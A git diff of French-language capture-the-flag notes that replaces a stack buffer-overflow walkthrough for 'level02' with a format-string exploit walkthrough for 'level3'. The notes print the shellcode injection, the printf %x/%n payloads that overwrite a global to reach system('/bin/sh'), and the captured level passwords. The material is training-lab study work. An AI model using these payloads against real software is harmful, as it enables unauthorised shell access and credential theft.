@@ -1,47 +1,80 @@
-J'ai ouvert le binaire avec gdb
+la faille se trouve sur la function printf() car elle est appellee avec un seul argument donee par stdin.
 
-puis creer un patern grace a 
-	pattern_create 200
-puis j'ai run le programme avec ce pattern
-	r < 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'
-Il y a un Invalid $PC address: 0xXXXXXXX
-Donc je recherche l'offset ou le return adress est ecrase (EIP)
-	pattern offset AJAA
-		AJAA found at offset: 80
-pettern search est encore plus puissant
-	pattern search
-		Registers contain pattern buffer:
-		EIP+0 found at offset: 80
-		EBP+0 found at offset: 76
-		Registers point to pattern buffer:
-		[EAX] --> offset 0 - size ~200
-		[EDX] --> offset 0 - size ~200
-		[ESP] --> offset 84 - size ~116
-		Pattern buffer found at:
-		0x0804a04b : offset   67 - size  133 ([heap])
-		0xb7fd9043 : offset   67 - size  133 (mapped)
-		0xb7fda000 : offset    0 - size  200 (mapped)
-		0xbffff6ef : offset   67 - size  133 ($sp + -0x11 [-5 dwords])
-		References to pattern buffer found at:
-		0xb7fd1acc : 0xb7fda000 (/lib/i386-linux-gnu/libc-2.15.so)
-		0xb7fd1ad0 : 0xb7fda000 (/lib/i386-linux-gnu/libc-2.15.so)
-		0xb7fd1ad4 : 0xb7fda000 (/lib/i386-linux-gnu/libc-2.15.so)
-		0xb7fd1ad8 : 0xb7fda000 (/lib/i386-linux-gnu/libc-2.15.so)
-		0xb7fd1adc : 0xb7fda000 (/lib/i386-linux-gnu/libc-2.15.so)
+LIVRE:HACKING THE ART EXPLOITATION DE John Exploitatiom
+	page 168 - 174
 
-Ne pouvant pas ret sur une valeur sur ma stack a cause de :  eax,0xb0000000 cmp    eax,0xb0000000
-je vais ret sur le retour de malloc car son adresse ne commence pas par 0x0b
-shellcode est genere par gdb
+Dans la fonction v, on peut voir un appelle a sytem("/bin/sh"). C est notre objectif. Mais pour y arrriver il faut passer par une comparaison d'une value dans le bss a l'adresse 0x804988c.
+
+Pour cela nous allons exploiter printf
+En faisant lui denans dans l input (perl -e 'print "%08x."x40') one remarque qu il y a un pattern qui revient souvent 0x25 0x30 0x38 0x78 en little endian. ce qui correspond a %08x
+	printf "\x25\x30\x38\x78"
+%08x%
+
+On remarque que la premiere fois qu'on voit cette value ce trouve au 4e '%' (arguments).
+	(perl -e 'print "AAAA", "%08x.%08x.%08x.%08x"') | ./level3
+		AAAA00000200.b7fd1ac0.b7ff37d0.41414141
+On a la value en hexa de notre AAAAA. Avec printf il y a different d'output type, on peut print une string avec %s. Via gdb on va essayer de print une string de l'env
+	dans gdb: x/10s *environ
+		0xbffff8e2:	 "SHELL=/bin/bash"
+0xbffff8f2:	 "TERM=xterm-256color"
+0xbffff906:	 "SSH_CLIENT=10.12.6.15 58589 4242"
+0xbffff927:	 "SSH_TTY=/dev/pts/1"
+0xbffff93a:	 "USER=level3"
+	
+	r < <(perl -e 'print "\xe2\xf8\xff\xbf", "%08x.%08x.%08x.%08s"')
+		����00000200.b7fd1ac0.b7ff37d0.SHELL=/bin/bash
+
+On peut voir la value SHELL=/bin/bash
+De plus le %n petmet de modifier cette value. J'ai change l'adresse de l'ENV par celle utilisee dans la comparaison pour acceder a la function system().
+	r < <(perl -e 'print "\x8c\x98\x04\x08" , "%08x.%08x.%08x.%08n"')
+	x/x 0x804988c
+Avant le passage de prinf	
+		0x804988c <m>:	0x00000000
+Apres:
+		0x804988c <m>:	0x1f
+
+On peut remarquer que la value a ete modifie par 0x1f. Pour passer la condition il faut que cette value soit a 0x40. PAGE 173 "This can be ontrolled to a greater degree by manipulating the field width option"
+Donc en rajoutant des caracteres apres mon adresse je devrais pour changer la value.
+	r < <(perl -e 'print "\x8c\x98\x04\x08","A"x38,"%x.%x.%x.%n"')
+	x/x 0x804988c
+		0x804988c <m>:	0x40
+
+BINGO c'est bon.
+
+Sans GDB: 
+	(perl -e 'print "\x8c\x98\x04\x08","A"x38,"%x.%x.%x.%n"'; cat -) | ./level3
+
+BINGO on a un shell
+
+cat /home/user/level4/.pass
+b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
 
 
-[SHELLCODE][padding][[EIP ret sur le retour du strdup]
 
 
-python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31" + "\xc9\x89\xca\x6a\x0b\x58\xcd\x80" + "A"*56 +"\x08\xa0\x04\x08"' > toto
 
-cat toto - | ./level02
-ET BOOM un shell !
 
-cd /home/user/level3
-cat .pass
-492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+pour gdb:
+	addresse a modifier 0x804988c
+	break avant le printf 0x80484d5
+
+r < <(perl -e 'print "\x8c\x98\x04\x08","A"x38,"%x.%x.%x.%n\n"') === working gdb
